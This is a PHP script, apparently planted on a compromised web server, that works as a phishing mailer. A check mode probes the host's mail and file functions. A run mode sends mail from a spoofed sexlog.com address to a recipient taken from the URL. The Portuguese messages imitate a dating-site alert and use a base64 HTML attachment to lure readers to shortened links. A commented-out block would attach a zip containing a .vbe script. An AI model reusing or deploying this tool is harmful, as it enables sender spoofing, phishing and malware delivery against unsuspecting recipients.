<?php

if ($_GET["check"]) {
echo '<br>test'.'ou15';

if (function_exists('getcwd')) 
{
echo '<br>;';
echo '===>'.getcwd();
echo ';<br>';
}

if (function_exists('mail')) 
{
echo '[#'.'D33]<br>';
 }

if (function_exists('file_get_contents')) 
{
echo '[#'.'D34]<br>';
 }

if (function_exists('stream_get_wrappers')) 
{
echo '[#'.'D35]<br>';
print_r(stream_get_wrappers());
echo '<br>';
 }
echo 'Terminou...<br>';
}

$assunto = 'Participante Sexlog lhe enviou um convite pessoal.';


if ($_GET["sub"]) {
$assunto = 'COD: '.$_GET["sub"];
}

if ($_GET["run"]) {

//date_default_timezone_set('America/Sao_Paulo');

$data3=date('YmdHis');


$to = $_GET["to"];

$boundary = "_a58505c5-e609-4fab-b39a-0640cd470aea_"; 

$headers = "From: Participante".rand(5, 1000)."@sexlog.com\n";
$headers .= "MIME-Version: 1.0\n";
$headers .= "Content-Type: multipart/mixed;\n boundary=\"" . $boundary . "\"\n\n";
//$headers.="To: $to\r\n";


$msg = "--". $boundary . "\n";



$msg .= 'Content-Type: text/html; charset="utf-8"'."\n\n";
//$msg .= "Content-Transfer-Encoding: base64\n";

$msg .= '<p>O Us&uacute;ario amoreliberdade3000 est&aacute; conectado agora. </p>
<img src="https://bitly.com/1rdJPR8?'.rand(5, 1000).'='.rand(5, 1000).'">
<p>estou esperando hoje a noite</p>
<p> mandei o restante dos videos pra voc&ecirc; no meu perfil </p>
'."\n";



/*$msg .= "--". $boundary . "\n";
$msg .= "Content-Type: application/zip;\n";
$msg .= "Content-Transfer-Encoding: base64\n";
$msg .= "Content-Disposition: attachment; filename=\"Arquivof20838a8df7cc0babd745c7af4b7d94e2".$data3.".zip\"\n\n";



$msg .= "UEsDBAoAAAAAAKdZuEgAAAAAAAAAAAAAAAAFAAAAMS52YmVQSwECPwAKAAAAAACnWbhIAAAAAAAA
AAAAAAAABQAkAAAAAAAAACAAAAAAAAAAMS52YmUKACAAAAAAAAEAGADp45JoxrXRAenjkmjGtdEB
6eOSaMa10QFQSwUGAAAAAAEAAQBXAAAAIwAAAAAA". "\n";
*/






$msg .= "--". $boundary . "\n";
$msg .= "Content-Type: text/html; charset=\"utf-8\";\n";
$msg .= "Content-Transfer-Encoding: base64\n";
$msg .= "Content-Disposition: attachment; filename=\"".rand(5, 1000).rand(5, 1000).$data3.".html\"\n\n";


$msg .= "PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCjwhLS0NCi5zdHlsZTEgew0KCWZvbnQtc2l6ZTogMzZweDsNCglmb250LXN0eWxlOiBpdGFsaWM7DQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQouc3R5bGUyIHsNCgljb2xvcjogI0ZGMDA2NjsNCglmb250LXN0eWxlOiBpdGFsaWM7DQp9DQouc3R5bGUzIHtjb2xvcjogI0ZGMDBGRn0NCi0tPg0KPC9zdHlsZT4NCjxwIGFsaWduPSJjZW50ZXIiPiZuYnNwOzwvcD4NCjxwIGFsaWduPSJjZW50ZXIiIGNsYXNzPSJzdHlsZTEiPk8gVXMmdWFjdXRlO2FyaW8gYW1vcmVsaWJlcmRhZGUzMDAwPC9wPg0KPHAgYWxpZ249ImNlbnRlciIgY2xhc3M9InN0eWxlMiI+PGEgaHJlZj0iaHR0cDovL2JpdC5seS8xWGJmd1o0IiBjbGFzcz0ic3R5bGUzIj4mZ3Q7Jmd0OyZndDsmZ3Q7TGluayBkbyBBbGJ1bSBEaWdpdGFsICZsdDsmbHQ7Jmx0OyZsdDsgPC9hPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiIGNsYXNzPSJzdHlsZTIiPjxpbWcgc3JjPSJodHRwOi8vYml0Lmx5LzFVRjhQdVciPjwvcD4NCg==". "\n";

$msg .= "--". $boundary ."--". "\n";
if (mail($to, $assunto, $msg, $headers)) {

echo "xxx"."sent!";
}
else
{
echo "Error send"."ing email.";
}
}
?>